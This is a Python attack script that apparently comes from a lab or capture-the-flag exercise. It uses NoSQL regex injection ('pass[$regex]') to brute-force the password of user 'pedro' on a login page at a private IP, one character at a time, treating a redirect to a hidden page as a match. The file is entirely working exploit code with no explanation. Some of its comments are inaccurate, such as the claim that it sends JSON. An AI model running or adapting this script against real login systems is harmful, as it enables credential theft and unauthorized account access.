import requests
import string

url="http://10.10.1.19/login.php"
obtained_pass=""
pass_len = 11



characters = "abcdefghijklmnopqrstuvwxyz" + string.digits

def send_request(url, username, regex):

    payload = {
        "user": username,  # Simple mistake : Forgot to enclose 'user' and 'pass' in double quotes
        "pass[$regex]": regex
    }

    print(f"Passed Regex : {regex}")

    #Send payload in body as 'json'.
    response = requests.post(url, data=payload, allow_redirects=False)

    #Debug
    print(f"Response Headers Length: {response.headers, len(response.headers)} \n\n")

    #Return true if it worked, false if not
    return 'Location' in response.headers and '/sekr3tPl4ce.php' in response.headers['Location']  ## Remaining to add values here

def build_regex(obtained_pass, char, position):
    
    regex = f"^{obtained_pass}{char}{'.' * (pass_len - position)}$"
    return regex



for position in range(1, pass_len + 1):
    for char in characters:
        result = send_request(url, 'pedro', build_regex(obtained_pass, char, position))

        if result:
            obtained_pass += char
            print(position, obtained_pass)
            break

    
print(obtained_pass)

    